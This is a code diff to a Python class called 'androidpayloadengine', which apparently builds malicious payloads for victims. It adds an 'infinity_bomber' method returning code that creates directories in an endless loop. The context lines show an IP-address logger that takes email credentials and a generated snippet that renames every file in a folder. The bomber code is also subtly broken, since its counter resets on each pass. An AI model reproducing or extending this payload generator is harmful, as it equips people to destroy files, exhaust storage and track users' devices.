@@ -1,9 +1,10 @@
 # import socket
-# import os
+import os
+import random
 # import smtplib
 
 
-class androidpayloadengine():
+class androidpayloadengine:
 
     def ip_address_logger(self, email, passw, recv_email):
         self.email = email
@@ -70,5 +71,15 @@ for file in files:
 \t\tos.rename(file, '{self.name}')
 \texcept:
 \t\tpass"""
+
+        return code
+
+    def infinity_bomber(self):
+        code = '''
+import os
+while True:
+\tx = 0
+\tos.mkdir(f'Blah{str(x)}')
+\tx += 1'''
 
         return code
